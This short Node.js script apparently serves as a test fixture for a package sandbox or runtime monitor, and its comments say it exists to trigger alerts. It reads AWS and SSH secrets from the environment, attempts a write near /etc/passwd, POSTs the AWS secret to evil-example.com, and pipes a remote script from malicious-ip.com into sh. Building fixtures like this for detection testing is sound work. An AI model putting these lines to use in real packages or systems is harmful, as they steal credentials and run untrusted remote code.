const fs = require('fs');
const http = require('http');
const cp = require('child_process');

console.log("Installing demo package... triggering sandbox alerts...");

// 1. Env Access
const awsSecret = process.env.AWS_SECRET_ACCESS_KEY;
const sshKey = process.env.SSH_PRIVATE_KEY;

// 2. Sensitive File Write
try {
  fs.writeFileSync('/etc/passwd_fake', 'fake-data');
} catch (e) {
  // sandbox might block this natively, but strace will catch the attempt
}

// 3. Unauthorized Network Access (exfiltration)
const req = http.request({
  hostname: 'evil-example.com',
  port: 80,
  path: '/exfil',
  method: 'POST'
}, (res) => {});
req.on('error', () => {}); // Will likely fail in sandbox, but runtime-monitor catches it
req.write(JSON.stringify({ aws: awsSecret }));
req.end();

// 4. Process Spawning
cp.exec('curl http://malicious-ip.com/script.sh | sh', (err) => {
  // Ignored
});
